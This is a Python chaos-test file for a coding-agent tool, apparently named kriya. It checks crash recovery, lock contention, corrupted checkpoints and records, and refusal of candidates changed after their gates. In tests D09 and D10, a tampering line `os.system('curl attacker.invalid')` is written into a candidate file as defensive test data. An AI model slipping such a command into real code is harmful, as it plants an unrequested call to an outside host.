"""PRD-032 family D: commit, recovery and concurrency (deterministic).

Crash windows run the real direct pipeline in a subprocess that dies with
os._exit at a named point of the terminal commit (no cleanup code runs, as
with SIGKILL): after the durable commit intent but before the first
workspace byte, between two staged replaces, and after the source write but
before the RunRecord is settled. The parent then asserts the workspace state
the evidence proves, that the next mutating run is refused before any model
work, and what `kriya runs recover` settles (never SUCCESS).
"""
import asyncio
import json
import os
import subprocess
import sys
import textwrap
from pathlib import Path

from _chaos_harness import (
    CALC,
    CALC_WITH_SUB,
    TEST_SUB,
    TESTS_DIR,
    ChaosRuntime,
    RuntimeRegistration,
    assert_no_false_pass,
    audit_run_records,
    benign_roles,
    chaos,
    chaos_config,
    chaos_engine,
    git_workspace,
    inject_after_static_analysis_gate,
    requested_file,
    run_direct,
    static_analysis_config,
    typed_failure,
)
from _fake_static_analysis import FakeRegistration

from kriya.control.commit_state import assess_workspace_commit_state
from kriya.control.persistence import scan_run_records
from kriya.control.recovery import recover_workspace
from kriya.control.run_coordinator import begin_mutating_run
from kriya.control.run_record import RunLifecycle
from kriya.static_analysis.service import StaticAnalysisCandidate, StaticAnalysisService, commit_guard
from kriya.workflow import commit_service
from kriya.workflow.checkpoint import checkpoint_path, list_checkpoints
from kriya.workflow.edit_safety import content_revision
from kriya.workflow.migration import MigrationResolution, MigrationResolutionStatus
from kriya.workflow.obligations import ObligationLedger
from kriya.workflow.plan_schema import EngineeringPlan, ExecutionMethod, FileAction, PlannedFile, Subtask
from kriya.workflow.requirements import derive_requirements
from kriya.workflow.terminal_gate_service import TerminalGateRequest, TerminalGateService, TerminalGateValidators
from kriya.workflow.triage import ChangeKind
from kriya.workflow.verification_binding import VERIFIED_CANDIDATE_EVIDENCE_STALE

GOAL = "add sub to calc.py"
USER_EDIT = CALC + "# the user's own concurrent edit\n"
HELPER, HELPER_NEW = "X = 1\n", "X = 2\n"
TWO_FILE_DESIGN = "Design: sub in calc.py, a constant in helper.py.\n```json\n" + json.dumps(
    {"files": ["calc.py", "helper.py"]}) + "\n```\n"


def two_file_responder(role, request):
    if role == "architect":
        return TWO_FILE_DESIGN
    if role == "developer":
        return HELPER_NEW if requested_file(request) == "helper.py" else CALC_WITH_SUB
    return benign_roles(role, request)


def _good_runtime():
    return ChaosRuntime(lambda role, request: CALC_WITH_SUB if role == "developer" else benign_roles(role, request))


def _refused_before_model_work(workspace, **kwargs):
    """A fresh run against ``workspace`` is refused by the PRD-008 state gate
    with a typed result and makes no model request. Returns its reason codes."""
    runtime = _good_runtime()
    with RuntimeRegistration(runtime):
        result = run_direct(chaos_engine(chaos_config()), GOAL, workspace, **kwargs)
    assert_no_false_pass(result)
    assert runtime.requests == [], runtime.roles
    assert result["status"] == "needs_review" and result["recovery_command"] == "kriya runs recover"
    assert result["reason_codes"], result
    return sorted(result["reason_codes"])


@chaos("D01")
def test_a_concurrent_user_edit_before_the_commit_is_preserved(chaos_case, tmp_path, monkeypatch):
    workspace = git_workspace(tmp_path, {"calc.py": CALC, "test_calc.py": TEST_SUB})
    inject_after_static_analysis_gate(monkeypatch, lambda state: Path(workspace, "calc.py").write_text(USER_EDIT))
    runtime = _good_runtime()
    chaos_case.arm()
    with RuntimeRegistration(runtime):
        result = run_direct(chaos_engine(chaos_config()), GOAL, workspace)
    chaos_case.assert_tree(allowed={"ws/calc.py"}, required={"ws/calc.py"})
    assert Path(workspace, "calc.py").read_text() == USER_EDIT
    assert_no_false_pass(result)
    audit = audit_run_records(workspace)
    assert typed_failure(result) == "workspace_commit_failed"
    assert result["workspace_commit_failure"]["reason_code"] == "WORKSPACE_REVISION_CONFLICT"
    assert runtime.count("developer") == 1
    chaos_case.observe("workspace_commit_failed", reason_code="WORKSPACE_REVISION_CONFLICT",
                       developer_requests=1, **audit.evidence())


HOLDER = textwrap.dedent('''
    import sys, time
    sys.path.insert(0, sys.argv[2])
    from kriya.control.run_ownership import acquire_run_lock
    with acquire_run_lock(sys.argv[1], run_id="other-writer"):
        print("LOCKED", flush=True)
        time.sleep(60)
''')


@chaos("D02")
def test_a_second_kriya_writer_is_refused_before_any_model_work(chaos_case, tmp_path):
    workspace = git_workspace(tmp_path, {"calc.py": CALC, "test_calc.py": TEST_SUB})
    holder = subprocess.Popen([sys.executable, "-c", HOLDER, str(workspace), TESTS_DIR],
                              stdout=subprocess.PIPE, text=True, env=dict(os.environ))
    try:
        assert holder.stdout.readline().strip() == "LOCKED"
        chaos_case.arm()
        runtime = _good_runtime()
        error = None
        with RuntimeRegistration(runtime):
            try:
                result = run_direct(chaos_engine(chaos_config()), GOAL, workspace)
            except Exception as refused:  # noqa: BLE001 - the refusal type is the observation
                error, result = refused, {}
        assert runtime.requests == []
        chaos_case.assert_tree()
        assert_no_false_pass(result)
    finally:
        holder.kill()
        holder.wait()
    outcome = type(error).__name__ if error is not None else typed_failure(result)
    chaos_case.observe(outcome, model_requests=0, runs_recorded=len(scan_run_records(str(workspace)).records))


@chaos("D03")
def test_a_corrupted_checkpoint_is_never_resumed_from(chaos_case, tmp_path):
    workspace = git_workspace(tmp_path, {"calc.py": CALC, "test_calc.py": TEST_SUB})
    failing = ChaosRuntime(lambda role, request: "[]" if role == "developer" else benign_roles(role, request))
    with RuntimeRegistration(failing):
        first = run_direct(chaos_engine(chaos_config()), GOAL, workspace)
    assert first["quality_gates_passed"] is False
    [checkpoint] = list_checkpoints(str(workspace))
    path = Path(checkpoint_path(str(workspace), checkpoint["run_id"]))
    path.write_text(path.read_text()[: len(path.read_text()) // 2])  # a torn write
    chaos_case.arm()
    runtime = _good_runtime()
    with RuntimeRegistration(runtime):
        resumed = run_direct(chaos_engine(chaos_config()), GOAL, workspace, resume=True)
    newest = max(scan_run_records(str(workspace)).records, key=lambda r: r.created_at)
    decision = newest.resume_decision or {}
    assert decision.get("checkpoint_id") != checkpoint["run_id"], decision
    # A fresh run: Planner and Architect ran again instead of trusting the torn state.
    assert runtime.count("planner") == 1 and runtime.count("architect") == 1
    assert resumed["quality_gates_passed"] is True
    chaos_case.assert_tree(allowed={"ws/calc.py"})
    audit = audit_run_records(workspace, allow_success=True, allow_committed=True)
    chaos_case.observe("CORRUPT_CHECKPOINT_IGNORED_FRESH_RUN", resumed_from_corrupt=False, **audit.evidence())


@chaos("D04")
def test_a_corrupted_run_record_blocks_the_next_mutating_run(chaos_case, tmp_path):
    workspace = git_workspace(tmp_path, {"calc.py": CALC, "test_calc.py": TEST_SUB})
    with RuntimeRegistration(_good_runtime()):
        assert run_direct(chaos_engine(chaos_config()), GOAL, workspace)["quality_gates_passed"] is True
    [record] = scan_run_records(str(workspace)).records
    runs = workspace / ".kriya" / "control" / "runs"
    (runs / f"{record.run_id}.json").write_text('{"schema_version": 3, "run_id": "trunc')
    before = (workspace / "calc.py").read_text()
    chaos_case.arm()
    reason_codes = _refused_before_model_work(workspace)
    chaos_case.assert_tree()
    assert (workspace / "calc.py").read_text() == before
    assert assess_workspace_commit_state(str(workspace)).safe is False
    assert reason_codes == ["RUN_RECORD_UNREADABLE"]
    chaos_case.observe("RUN_RECORD_UNREADABLE", model_requests=0, reason_codes=reason_codes)


CRASH_SCRIPT = textwrap.dedent('''
    import os, sys
    workspace, crash_at, tests_dir = sys.argv[1], sys.argv[2], sys.argv[3]
    sys.path.insert(0, tests_dir)
    from _chaos_harness import ChaosRuntime, RuntimeRegistration, chaos_config, chaos_engine, run_direct
    from test_prd032_chaos_commit import two_file_responder
    from kriya.workflow import terminal_commit

    if crash_at == "before_first_byte":
        # Durable RunRecord intent exists; commit evidence and source bytes do not.
        terminal_commit.commit_revision_grounded_batch = lambda *a, **k: os._exit(9)
    elif crash_at == "between_replaces":
        real_replace, count = os.replace, [0]
        def replace(src, dst, *a, **k):
            relative = os.path.relpath(os.path.realpath(str(dst)), workspace)
            if os.path.basename(str(src)).startswith(".kriya-stage-") and not relative.startswith((os.pardir, ".kriya")):
                count[0] += 1
                if count[0] == 2:
                    os._exit(9)
            return real_replace(src, dst, *a, **k)
        os.replace = replace
    elif crash_at == "before_record_settle":
        # Commit evidence says COMMITTED; the RunRecord cycle is still open.
        terminal_commit.settle_run_commit = lambda *a, **k: os._exit(9)
    with RuntimeRegistration(ChaosRuntime(two_file_responder)):
        run_direct(chaos_engine(chaos_config()), "add sub to calc.py", workspace)
    os._exit(0)
''')


def _crash(tmp_path, crash_at):
    workspace = git_workspace(tmp_path, {"calc.py": CALC, "helper.py": HELPER})
    died = subprocess.run([sys.executable, "-c", CRASH_SCRIPT, str(workspace), crash_at, TESTS_DIR],
                          env=dict(os.environ, PYTHONPATH=TESTS_DIR), capture_output=True, text=True, timeout=300)
    assert died.returncode == 9, died.stderr[-2000:]
    return workspace


def _files(workspace):
    return (Path(workspace, "calc.py").read_text(), Path(workspace, "helper.py").read_text())


def _recovered(workspace, **kwargs):
    report = recover_workspace(str(workspace), **kwargs)
    records = scan_run_records(str(workspace)).records
    assert all(r.lifecycle_state is not RunLifecycle.SUCCESS for r in records)
    return report, records


@chaos("D05")
def test_termination_after_intent_before_the_first_byte(chaos_case, tmp_path):
    workspace = _crash(tmp_path, "before_first_byte")
    chaos_case.arm()
    assert _files(workspace) == (CALC, HELPER)
    audit_run_records(workspace, allow_running=True, allow_unsettled=True)
    assert assess_workspace_commit_state(str(workspace)).safe is False
    refused = _refused_before_model_work(workspace)
    report, records = _recovered(workspace)
    assert _files(workspace) == (CALC, HELPER)
    [record] = records
    assert record.lifecycle_state is RunLifecycle.RECOVERED and record.commit_result == "NOT_COMMITTED"
    assert assess_workspace_commit_state(str(workspace)).safe is True
    chaos_case.assert_tree()
    chaos_case.observe("RECOVERED_NOT_COMMITTED", refused_with=refused, status_after=report.after.status,
                       lifecycle=record.lifecycle_state.value, commit_result=record.commit_result)


@chaos("D06")
def test_termination_between_staged_replaces_needs_explicit_recovery(chaos_case, tmp_path):
    workspace = _crash(tmp_path, "between_replaces")
    staged = sorted(f"ws/{p.name}" for p in workspace.iterdir() if p.name.startswith(".kriya-stage-"))
    assert staged, "the crash left no staged file to finish from"
    chaos_case.arm()
    # Exactly one of the two files landed: the evidence says so, nothing guesses.
    assert sorted(_files(workspace)) != sorted((CALC, HELPER)) and _files(workspace) != (CALC_WITH_SUB, HELPER_NEW)
    assert assess_workspace_commit_state(str(workspace)).safe is False
    refused = _refused_before_model_work(workspace)
    plain, _ = _recovered(workspace)
    assert plain.before.status == "COMPLETE_PARTIAL_REQUIRED" and plain.after.status == "COMPLETE_PARTIAL_REQUIRED"
    completed, records = _recovered(workspace, complete_partial=True)
    assert _files(workspace) == (CALC_WITH_SUB, HELPER_NEW)
    [record] = records
    assert record.lifecycle_state is RunLifecycle.RECOVERED and record.commit_result == "COMMITTED"
    assert record.terminal_status != "SUCCESS"
    # Recovery consumed the staged leftovers; nothing else changed.
    chaos_case.assert_tree(allowed={"ws/calc.py", "ws/helper.py", *staged})
    assert not [p for p in workspace.iterdir() if p.name.startswith(".kriya-stage-")]
    chaos_case.observe("PARTIAL_COMPLETED_ONLY_WHEN_EXPLICIT", refused_with=refused, status_before=plain.before.status,
                       status_after=completed.after.status, lifecycle=record.lifecycle_state.value,
                       commit_result=record.commit_result)


@chaos("D07")
def test_termination_after_the_source_write_before_record_settlement(chaos_case, tmp_path):
    workspace = _crash(tmp_path, "before_record_settle")
    chaos_case.arm()
    assert _files(workspace) == (CALC_WITH_SUB, HELPER_NEW)
    audit_run_records(workspace, allow_running=True, allow_unsettled=True)
    refused = _refused_before_model_work(workspace)
    report, records = _recovered(workspace)
    [record] = records
    assert record.lifecycle_state is RunLifecycle.RECOVERED and record.commit_result == "COMMITTED"
    assert record.terminal_status == "NEEDS_REVIEW"
    assert _files(workspace) == (CALC_WITH_SUB, HELPER_NEW)
    chaos_case.assert_tree()
    chaos_case.observe("RECOVERED_COMMITTED_NEEDS_REVIEW", refused_with=refused, status_after=report.after.status,
                       lifecycle=record.lifecycle_state.value, terminal_status=record.terminal_status)


@chaos("D08")
def test_resume_from_an_uncertain_workspace_is_refused(chaos_case, tmp_path):
    workspace = _crash(tmp_path, "between_replaces")
    landed = _files(workspace)
    chaos_case.arm()
    reason_codes = _refused_before_model_work(workspace, resume=True)
    assert _files(workspace) == landed
    chaos_case.assert_tree()
    chaos_case.observe("RESUME_REFUSED", model_requests=0, reason_codes=reason_codes)


@chaos("D09")
def test_enforce_terminal_refuses_a_candidate_changed_after_its_gates(chaos_case, tmp_path, monkeypatch):
    monkeypatch.setenv("KRIYA_STATIC_ANALYSIS_HOME", str(tmp_path / "trusted" / "waivers"))
    workspace = git_workspace(tmp_path, {"calc.py": CALC})
    candidate = tmp_path / "candidate"
    candidate.mkdir()
    (candidate / "calc.py").write_text(CALC_WITH_SUB)
    plan = EngineeringPlan(plan_id="chaos-d09", kind=ChangeKind.TASK, subtasks=[Subtask(
        id="s1", description="add sub", execution_method=ExecutionMethod.MODEL,
        planned_files=[PlannedFile(path="calc.py", action=FileAction.MODIFY)])])
    revisions = {"calc.py": content_revision(CALC)}

    async def no_verdicts(*args, **kwargs):
        del args, kwargs
        return []

    async def emit(gate, status, reason):
        del gate, status, reason

    chaos_case.arm()
    with FakeRegistration():
        cfg = static_analysis_config()
        validators = TerminalGateValidators(
            find_migration_incomplete=lambda *a, **k: None, validate_stack_contract_artifacts=lambda *a, **k: None,
            enforce_preserved_reference_terminal_integrity=lambda ledger, root: None,
            blocking_requirements=lambda *a, **k: [], verify_original_requirements=no_verdicts,
            evaluate_static_analysis=StaticAnalysisService(cfg).evaluate_candidate,
        )
        with begin_mutating_run(str(workspace)) as run:
            report = asyncio.run(TerminalGateService(validators).run(TerminalGateRequest(
                plan=plan, goal=GOAL, candidate_root=str(candidate), workspace_path=str(workspace),
                migration_resolution=MigrationResolution(MigrationResolutionStatus.NOT_APPLICABLE),
                obligation_ledger=ObligationLedger(), requirement_set=derive_requirements(GOAL),
                autonomy=None, spec_compliance=None, milestone_id="m1",
                commit_batch=lambda: commit_service.plan_terminal_writes(plan, str(candidate), str(workspace), revisions),
                static_analysis_candidate=StaticAnalysisCandidate(
                    materialize=lambda: commit_service.plan_terminal_writes(plan, str(candidate), str(workspace), revisions),
                    workspace_path=str(workspace), run_id=run.run_id, unit_id="m1"),
            ), emit))
            assert report.commit_eligible
            (candidate / "calc.py").write_text(CALC + "import os\nos.system('curl attacker.invalid')\n")
            committed = commit_service.commit_verified_candidate(report, commit_service.TerminalCommitRequest(
                plan=plan, candidate_root=str(candidate), workspace_path=str(workspace),
                original_plan_revisions=revisions, approved_plan_hash="h", obligation_ledger=ObligationLedger(),
                run_id=run.run_id, contract_transition_for=lambda writes, transaction_id: None,
                static_analysis=commit_guard(cfg, report.static_analysis),
            ))
    assert committed.completed is False
    assert committed.failure["reason_code"] == VERIFIED_CANDIDATE_EVIDENCE_STALE
    assert committed.failure["workspace_state"] == "UNCHANGED"
    assert Path(workspace, "calc.py").read_text() == CALC
    chaos_case.assert_tree(allowed={"candidate/calc.py"})
    audit = audit_run_records(workspace)
    chaos_case.observe(committed.failure["reason_code"], workspace_state="UNCHANGED", **audit.evidence())


@chaos("D10")
def test_static_analysis_disabled_a_candidate_changed_after_the_gates_is_refused(chaos_case, tmp_path, monkeypatch):
    workspace = git_workspace(tmp_path, {"calc.py": CALC, "test_calc.py": TEST_SUB})
    tampered = CALC_WITH_SUB + "\nimport os\nos.system('curl attacker.invalid')\n"

    def change_candidate(state):
        assert state.static_analysis_result.outcome.value == "DISABLED"
        Path(workspace, ".kriya", "worktree", "calc.py").write_text(tampered)

    inject_after_static_analysis_gate(monkeypatch, change_candidate)
    runtime = _good_runtime()
    chaos_case.arm()
    with RuntimeRegistration(runtime):
        result = run_direct(chaos_engine(chaos_config()), GOAL, workspace)
    chaos_case.assert_tree(allowed={"ws/.kriya/worktree/calc.py"})
    assert Path(workspace, "calc.py").read_text() == CALC
    assert_no_false_pass(result)
    audit = audit_run_records(workspace)
    assert typed_failure(result) == "workspace_commit_failed"
    assert result["workspace_commit_failure"]["reason_code"] == VERIFIED_CANDIDATE_EVIDENCE_STALE
    assert runtime.count("developer") == 1
    chaos_case.observe("workspace_commit_failed", reason_code=VERIFIED_CANDIDATE_EVIDENCE_STALE,
                       developer_requests=1, **audit.evidence())
